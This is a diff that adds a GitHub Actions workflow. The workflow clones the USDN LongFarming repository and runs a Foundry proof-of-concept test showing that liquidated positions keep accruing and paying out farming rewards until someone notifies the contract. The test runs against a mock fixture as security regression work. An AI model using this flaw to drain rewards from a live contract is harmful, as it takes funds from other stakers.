@@ -1,0 +1,86 @@
+name: USDN LongFarming post-liquidation PoC
+
+on:
+  push:
+    branches: [security/susdn-live-config]
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+      - name: Clone upstream LongFarming and add regression PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone --recursive https://github.com/SmarDex-Ecosystem/usdn-long-farming.git /tmp/usdn-long-farming
+          cd /tmp/usdn-long-farming
+          git checkout cd5f5e1f693c53a73d869a275cbf960ce9540c79
+          git submodule update --init --recursive
+
+          cat > test/unit/UsdnLongFarming/PostLiquidationRewards.t.sol <<'SOL'
+          // SPDX-License-Identifier: UNLICENSED
+          pragma solidity ^0.8.26;
+
+          import { IUsdnProtocolTypes } from "@smardex-usdn-contracts/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";
+          import { USER_1 } from "../../utils/Constants.sol";
+          import { UsdnLongFarmingBaseFixture } from "./utils/Fixtures.sol";
+
+          /// @notice Security regression PoC: a position that is already liquidated in USDN
+          /// continues to accrue FarmingRange rewards until someone explicitly notifies LongFarming.
+          contract TestPostLiquidationRewards is UsdnLongFarmingBaseFixture {
+              IUsdnProtocolTypes.Position internal position;
+              int24 internal constant TICK = 1234;
+              uint256 internal constant VERSION = 123;
+              uint256 internal constant INDEX = 12;
+
+              function setUp() public {
+                  _setUp();
+                  position = IUsdnProtocolTypes.Position({
+                      validated: true,
+                      timestamp: uint40(block.timestamp),
+                      user: address(this),
+                      totalExpo: 20,
+                      amount: 10
+                  });
+                  usdnProtocol.setPosition(position, VERSION, false);
+                  usdnProtocol.transferPositionOwnership(
+                      IUsdnProtocolTypes.PositionId(TICK, VERSION, INDEX), address(farming), ""
+                  );
+              }
+
+              function test_liquidatedPositionAccruesRewardsForEntireNotificationDelay() public {
+                  // At this exact block the USDN position becomes economically liquidated.
+                  usdnProtocol.setPosition(position, VERSION, true);
+
+                  uint256 pendingAtLiquidation = farming.pendingRewards(TICK, VERSION, INDEX);
+                  assertEq(pendingAtLiquidation, 0, "fixture should start with no pending rewards");
+
+                  // No interaction with LongFarming for 100 blocks. The position remains in _totalShares.
+                  vm.roll(block.number + 100);
+
+                  uint256 pendingAfterDelay = farming.pendingRewards(TICK, VERSION, INDEX);
+                  assertGt(pendingAfterDelay, 0, "liquidated position must not keep accruing rewards");
+
+                  // A third party finally notifies via harvest(). _updateRewards() runs BEFORE _isLiquidated().
+                  vm.prank(USER_1);
+                  (bool isLiquidated,) = farming.harvest(TICK, VERSION, INDEX);
+                  assertTrue(isLiquidated, "position must be recognized as liquidated");
+
+                  uint256 ownerPaid = rewardToken.balanceOf(address(this));
+                  uint256 notifierPaid = rewardToken.balanceOf(USER_1);
+                  assertEq(ownerPaid + notifierPaid, pendingAfterDelay, "all stale rewards become payable");
+                  assertGt(ownerPaid, 0, "former owner receives post-liquidation rewards");
+
+                  emit log_named_uint("pending_at_liquidation", pendingAtLiquidation);
+                  emit log_named_uint("pending_after_100_block_delay", pendingAfterDelay);
+                  emit log_named_uint("former_owner_paid", ownerPaid);
+                  emit log_named_uint("notifier_paid", notifierPaid);
+              }
+          }
+          SOL
+
+          forge test --match-contract TestPostLiquidationRewards -vvvv
